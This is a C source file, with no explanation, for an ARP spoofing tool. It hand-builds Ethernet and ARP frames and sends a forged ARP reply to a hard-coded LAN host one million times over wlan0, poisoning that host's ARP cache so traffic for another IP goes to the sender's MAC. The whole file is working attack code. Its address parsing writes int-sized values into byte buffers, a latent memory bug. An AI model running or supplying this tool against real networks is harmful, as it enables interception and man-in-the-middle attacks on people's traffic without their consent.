#include <stdio.h>
#include <sys/types.h>
#include <ctype.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/in.h>



void mac_str(char *mac, char *buf)
{
	sscanf(mac, "%x:%x:%x:%x:%x:%x", buf, buf+1, buf+2,
			buf+3, buf+4, buf+5);
}
void ip_str(char *ip, char *buf)
{
	sscanf(ip, "%d.%d.%d.%d", buf, buf+1, buf+2, buf+3);
}
void encapsulate_frame(char *dest_mac, char* src_mac, 
	unsigned short type, char *buf)
{
	mac_str(dest_mac, buf);			
	mac_str(src_mac, buf+6);
	*(unsigned short*)(buf+12) = htons(type);	
}
void encapsulate_arp(unsigned short op, char *src_mac,char *src_ip,		char *dest_mac, char *dest_ip, char *buf)
{
	struct arphdr arp;
	arp.ar_hrd = htons(ARPHRD_ETHER);	
	arp.ar_pro = htons(ETHERTYPE_IP);
	arp.ar_hln = 6;
	arp.ar_pln = 4;
	arp.ar_op = htons(op);
	memcpy(buf, &arp, sizeof(struct arphdr));
	char addr[20] = {0};	
	mac_str(src_mac, addr);
	ip_str(src_ip, addr + 6);
	mac_str(dest_mac, addr + 10);
	ip_str(dest_ip, addr + 16);
	memcpy(buf + sizeof(struct arphdr), addr, 20);
}
int open_socket()
{
	int sock_fd = socket(AF_INET, SOCK_PACKET, ETH_P_ARP);
	if(sock_fd < 0){
		perror("socket err\n");
		exit(EXIT_FAILURE);
	}
	return sock_fd;
}
int main()
{
	char *src_ip = "192.168.199.242"; 
	char *src_mac = "00:22:FA:AF:DE:26";

	char *dest_ip = "192.168.199.155";
	char *dest_mac = "c0:18:85:1f:30:94";
	
	char *buf = (char *)malloc(sizeof(struct ether_header) +
	 30);	
	memset(buf, 0, 42);	

	encapsulate_frame(dest_mac, src_mac, ETHERTYPE_ARP, buf);
	encapsulate_arp(ARPOP_REPLY, src_mac, src_ip, dest_mac,
		dest_ip, buf + sizeof(struct ether_header));	
	
	int sock_fd = open_socket();
	
	struct sockaddr to;
	memset(&to, 0, sizeof(struct sockaddr));
	to.sa_family = AF_INET;
	strcpy(to.sa_data, "wlan0");	

	int i = 0;
	for(i=0; i<1000000; i++){	
		sendto(sock_fd, buf, 42, 0, &to,
				sizeof(struct sockaddr));
		usleep(1000);
	}

	printf("send over\n");

	return 0;
}



